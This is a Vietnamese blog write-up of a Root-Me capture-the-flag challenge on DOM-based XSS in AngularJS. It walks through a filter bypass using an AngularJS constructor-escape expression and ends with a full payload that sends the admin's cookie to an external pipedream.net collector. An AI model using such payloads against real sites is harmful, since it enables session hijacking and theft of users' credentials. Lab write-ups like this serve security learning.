---
template: overrides/blog.html
icon: material/plus-circle
title: XSS DOM Based - AngularJS
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
  - Forensics 
  - C&C
---

# __XSS DOM Based - AngularJS__

<span>
:octicons-calendar-24: April 04, 2023 ·
:octicons-clock-24: ~5 minutes

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Client/XSS-attack/xss-dom-DOM-Based-AngularJS?lang=en](https://www.root-me.org/en/Challenges/Web-Client/XSS-attack/xss-dom-DOM-Based-AngularJS?lang=en)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-client/ch3-attack/xss-dom5/][http://challenge01.root-me.org/web-client/ch3-attack/xss-dom5/]

  [http://challenge01.root-me.org/web-client/ch3-attack/xss-dom5/]: http://challenge01.root-me.org/web-client/ch3-attack/xss-dom5/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là ăn cắp được cookie đến từ phía admin. Mà đã cookie đến từ admin thì phải tự tay admin thực thi mới có cookie đó, điều này đồng nghĩa với việc ta cần một thứ gì đó nhằm bắt hành vi của admin và Requestbin là ứng cử viên sáng giá cho việc làm này.

Tiếp theo, ta biết được lệnh lấy cookie đơn giản là document.cookie. Well, ta triển khai kịch bản tấn công thôi nào!

## __Kịch bản tấn công__
### Bước 1: Kiểm tra website

Đầu tiên ta thử gõ vài thứ vào website và xem xét trạng thái như thế nào.

<figure markdown>
  ![Image title](/rootme/web-client/xss-attack/xss-dom/images/xss-dom-based-angularjs-01.png#zoom)
  <figcaption>Hình ảnh website challenge</figcaption>
</figure>

<figure markdown>
  ![Image title](/rootme/web-client/xss-attack/xss-dom/images/xss-dom-based-angularjs-02.png#zoom)
  <figcaption>Hình ảnh mô tả việc thêm nội dung deuteri vào box</figcaption>
</figure>

Ta thấy rằng khi ta thêm nội dung deuteri vào website, thì ngay lập tức nội dung này được đưa vào biến `name` trong thẻ script và nội dung thẻ script như dưới

<div class="result" markdown>

``` js linenums="1"
var name = 'deuteri';
var encoded = '';
for(let i = 0; i < name.length; i++) {
    encoded += name[i] ^ Math.floor(Math.random() * name.length);
}
encoded = Math.abs(encoded ^ Math.floor(Math.random() * name.length));
document.getElementById('name_encoded').innerText += ' ' + encoded;
```

</div>

Để ý rằng nội dung hàm này muốn encode thứ mà ta nhập vào. Nhưng việc hiểu code ở ngữ cảnh này là điều không quan trọng, mục tiêu của ta là chèn payload như nào để có thể bypass được đống code này.

Ta thử dùng cách bypass bình thường để gọi thông báo "1" bằng `deuteri';alert(1);` xem chuyện gì sẽ xảy ra

<figure markdown>
  ![Image title](/rootme/web-client/xss-attack/xss-dom/images/xss-dom-based-angularjs-03.png#zoom)
  <figcaption>Hình ảnh mô tả việc thêm hộp thông báo lên màn hình</figcaption>
</figure>

Không ngoài dự đoán, chả có chuyện gì xảy ra cả ::). Nó filter payload bất định và convert payload đơn thuần về 1 biến đơn thuần như hình dưới. Cụ thể nó xóa đi kí tự `'`.

<figure markdown>
  ![Image title](/rootme/web-client/xss-attack/xss-dom/images/xss-dom-based-angularjs-04.png#zoom)
  <figcaption>Hình ảnh mô tả việc bị filter payload</figcaption>
</figure>

### Bước 2: Tiêm payload

Ta sẽ kiểm tra XSS cheatsheet AngularJS thì ta nhận được cú pháp `{{constructor.constructor("alert(1)")()}}` là cú pháp đúng để hiển thị hộp thoại thông báo `1` lên màn hình.

<figure markdown>
  ![Image title](/rootme/web-client/xss-attack/xss-dom/images/xss-dom-based-angularjs-05.png#zoom)
  <figcaption>Hình ảnh mô tả việc tiêm thành công thông báo</figcaption>
</figure>


Well, bây giờ ta chỉ việc tạo thêm 

### Bước 3: Giải quyết challenge

Từ bước 2, ta đã biết được cú pháp tiêm payload để thực thi script do mình tạo ra.

Ở bước này ta sẽ tiến hành tiêm payload nhằm lấy cookie của admin bằng `document.cookie` với cú pháp đầy đủ của AngularJS: `{{constructor.constructor("document.location=\"https://eo1bklmdt6o4sv.m.pipedream.net?cookie=\\"+document.cookie")()}}`


Và tiếp theo ta chỉ cần đợi hành vi từ admin